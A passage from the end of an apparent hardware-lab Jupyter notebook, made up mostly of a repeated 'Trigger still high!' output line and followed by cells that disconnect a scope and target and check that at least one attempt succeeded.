    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    Trigger still high!
    



**In [10]:**

.. code:: ipython3

    scope.dis()
    target.dis()


**In [11]:**

.. code:: ipython3

    assert successes >= 1
